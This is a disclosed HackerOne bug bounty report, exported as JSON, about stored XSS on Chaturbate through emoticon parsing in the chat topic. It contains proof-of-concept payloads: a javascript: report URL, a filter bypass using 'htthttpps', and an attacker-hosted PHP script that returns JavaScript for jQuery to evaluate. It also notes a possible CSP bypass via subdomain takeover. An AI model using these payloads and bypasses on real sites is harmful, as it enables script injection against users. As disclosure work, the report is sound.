{"id":429298,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MjkyOTg=","url":"https://hackerone.com/reports/429298","title":"Stored XSS in chat topic due to insecure emoticon parsing on any message type","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-10-26T14:38:18.693Z","submitted_at":"2018-10-26T14:38:18.693Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"avlidienbrunn","url":"/avlidienbrunn","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/948/699d45bda29817e724a5a2399862812a14dba902_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":30475,"url":"https://hackerone.com/chaturbate","handle":"chaturbate","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/030/475/178c32f60a890eb06ce5d698d44b3eafa35ccf8c_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/030/475/178c32f60a890eb06ce5d698d44b3eafa35ccf8c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Chaturbate","twitter_handle":"chaturbate","website":"https://chaturbate.com","about":"The largest online adult cam site"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-11-01T20:22:29.144Z","bug_reporter_agreed_on_going_public_at":"2018-11-01T11:07:40.253Z","team_member_agreed_on_going_public_at":"2018-11-01T20:22:29.087Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Description\n\nThe funcitonality for adding emoticons into the chat from the serverside perspective is based on a string in the following format:\n\n```\n%%%[emoticon NAME|EMOTICON_URL|WIDTH|HEIGHT|REPORT_URL]%%%\n```\n\nThe `EMOTICON_URL` must conform to the following regex:\n```javascript\n/(http|https):\\/\\/(\\w+:{0,1}\\w*@)?(\\S+)(:[0-9]+)?(\\/|\\/([\\w#!:.?+=\u0026%@!\\-\\/]))?/g\n```\n\nHowever, the `REPORT_URL` does not have any checks that verifies the URL. This, combined with other issues listed below, leads to stored XSS.\n\n### Chat topic link filter bypass\n\nThe chat topic functionality has a filter that removes links from the topic, by removing the string `http`. This can be bypassed by using a string such as `htthttpps` (after replace becomes `https`).\n\n### XSS Via ctrl/mouse3 click and  `javascript:` `REPORT_URL`\nBy using a `javascript:` URL as `REPORT_URL`, we can create an emoji that, when clicked, will show the \"report emoticon\" prompt. By ctrl-clicking or mouse3-clicking the `REPORT EMOTICON` link, the XSS triggers.\n\n#### PoC\n\n1. Set topic to `LUL %%%[emoticon blush|htthttpps://public.chaturbate/uploads/avatar/2011/11/08/cxecSeKtWjRK.jpg|22|22|javascript:alert(1)]%%% WUT`\n2. Click emoticon\n3. Ctrl/mouse3 click `REPORT EMOTICON`\n\n{F366518}\n\n### XSS Via emoticon report due to insecure usage of jQuery $.ajax()\n\nThe functionality for reporting an emoticon sends an AJAX request to `REPORT_URL`. This leads to XSS due to the fact that jQuery will treat any `application/javascript` response as javascript and will evaluate the response.\n\n#### PoC\n\n1. Set topic to `LUL %%%[emoticon blush|htthttpps://public.chaturbate/uploads/avatar/2011/11/08/cxecSeKtWjRK.jpg|22|22|htthttpps://avlidienbrunn.se/xss.php]%%% WUT`\n2. Click emoticon\n3. Click `REPORT EMOTICON`\n4. Click `REPORT`\n\n{F366520}\n\nContents of `xss.php`:\n```php\n\u003c?php\nheader('Content-Type: text/javascript');\nheader('Access-Control-Allow-Origin: *');\nheader('Access-Control-Allow-Headers: X-Requested-With, connectUrl, X-CSRFToken');\n?\u003e\nalert(document.domain);\n```\n\n### Notes\n\n**CSP**\nThe reason the second XSS issue does not work in CSP enabled browsers is that no domain in my control is allowed by the `connect-src` directive. However, several `*.DOMAIN.COM` are included in `connect-src`:\n```javascript\nhttps://*.highwebmedia.com\nhttps://*.chaturbate.com\nhttps://*.hotjar.com:*\n```\nThis means this issue can be exploited if a [subdomain takeover](https://www.hacker101.com/vulnerabilities/subdomain_takeover.html) bug exists in any of those domains. Obviously I can't test for that, but it's an important note regarding impact.\n\n**Other exploitation areas**\nThe only place where I could find that didn't respond with a server error when using `%%%[emoticon ]%%%` was the room topic. However, if there is any other type of message that allows this string, that would be vulnerable as well, since the emoticon parsing functionality is ran on all messages.\n\n## Impact\n\nStored XSS on chaturbate.com with 2 click interaction.\n\nExploitation by using an offensive image in `EMOTICON_URL` using XSS payload in `REPORT_URL`. It's also possible to create an emoticon that covers the whole chat window by using a large value in `WIDTH` and `HEIGHT`:\n\n{F366528}","bounty_amount":"450.0","formatted_bounty":"$450","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":366518,"file_name":"Screen_Shot_2018-10-26_at_16.04.31.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/366/518/1851c7cded02f2edd8af8317d132378335f137b7/Screen_Shot_2018-10-26_at_16.04.31.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-10-26_at_16.04.31.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-10-26_at_16.04.31.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T145934Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=0a7bf9f9f24c259a36473c812f7f0f91d47e0a503114024cf075ab77e39e7b3c","file_size":234906,"type":"image/png"},{"id":366520,"file_name":"Screen_Shot_2018-10-26_at_16.18.37.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/366/520/5baafe019985e8faf892c2c9328f135f3b31f062/Screen_Shot_2018-10-26_at_16.18.37.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-10-26_at_16.18.37.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-10-26_at_16.18.37.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T145934Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=393fa8dbb1f356749d95c3aa461d39223425598e2cfb3bd396a86546d4f705e6","file_size":227489,"type":"image/png"},{"id":366528,"file_name":"Screen_Shot_2018-10-26_at_16.37.56.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/366/528/faf0aea6215d358c9d42dde3225cea05779c671b/Screen_Shot_2018-10-26_at_16.37.56.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-10-26_at_16.37.56.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-10-26_at_16.37.56.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T145934Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=7a71aae4ccda729beb2bd03f3338fb026f8802e1299a98227703037dd5cb959d","file_size":128242,"type":"image/png"}],"allow_singular_disclosure_at":"2018-12-01T11:07:40.290Z","allow_singular_disclosure_after":-90301914.0617517,"singular_disclosure_allowed":true,"vote_count":31,"voters":["badf00d","holme","fisher","bl4de","sameerphad72","spam404","ali","emitrani","realtess","eveeez","and 21 more..."],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":{"databaseId":11722,"asset_type":"URL","asset_identifier":"https://chaturbate.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3547321,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-10-29T05:04:26.966Z","updated_at":"2018-10-29T05:04:26.966Z","additional_data":{"old_severity":null,"new_severity":"Medium","old_severity_id":null,"new_severity_id":230540},"actor":{"username":"williammmllc","cleared":false,"url":"/williammmllc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3547324,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for the report. This should definitely not be parsed, however as you noted the CSP stops a lot of possible exploits here, so we consider this medium severity.","automated_response":false,"created_at":"2018-10-29T05:05:23.152Z","updated_at":"2018-10-29T05:05:23.152Z","actor":{"username":"williammmllc","cleared":false,"url":"/williammmllc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3547325,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2018-10-29T05:05:34.254Z","updated_at":"2018-10-29T05:05:34.254Z","actor":{"url":"/chaturbate","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/030/475/178c32f60a890eb06ce5d698d44b3eafa35ccf8c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Chaturbate"}},"bounty_amount":"450.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"chaturbate","collaborator":{"username":"avlidienbrunn","url":"/avlidienbrunn"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3548562,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks!","automated_response":false,"created_at":"2018-10-29T11:03:57.294Z","updated_at":"2018-10-29T11:03:57.294Z","actor":{"username":"avlidienbrunn","cleared":true,"url":"/avlidienbrunn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/948/699d45bda29817e724a5a2399862812a14dba902_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3567595,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"This is now resolved, thanks again for the report!","automated_response":false,"created_at":"2018-10-31T22:49:16.387Z","updated_at":"2018-10-31T22:49:16.387Z","actor":{"username":"williammmllc","cleared":false,"url":"/williammmllc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"avlidienbrunn","url":"/avlidienbrunn"},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3569299,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-11-01T11:07:40.275Z","updated_at":"2018-11-01T11:07:40.275Z","first_to_agree":true,"actor":{"username":"avlidienbrunn","cleared":true,"url":"/avlidienbrunn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/948/699d45bda29817e724a5a2399862812a14dba902_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3572187,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-11-01T20:22:29.111Z","updated_at":"2018-11-01T20:22:29.111Z","actor":{"username":"williammmllc","cleared":false,"url":"/williammmllc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3572188,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-11-01T20:22:29.164Z","updated_at":"2018-11-01T20:22:29.164Z","actor":{"username":"williammmllc","cleared":false,"url":"/williammmllc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}